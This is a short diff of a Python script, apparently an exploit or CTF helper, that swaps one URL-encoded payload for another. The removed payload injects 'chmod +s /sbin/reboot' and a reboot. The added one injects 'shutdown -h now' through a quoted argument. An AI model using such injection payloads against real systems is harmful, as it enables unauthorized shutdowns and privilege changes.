@@ -21,5 +21,5 @@ print(repr(received))
 s.close()
 
 import urllib.parse
-print(urllib.parse.unquote("%2F%20%26%20chmod%20%2Bs%20%2Fsbin%2Freboot%20%26%20reboot"))
+print(urllib.parse.unquote("%2F%22%20shutdown%20-h%20now%22"))
 
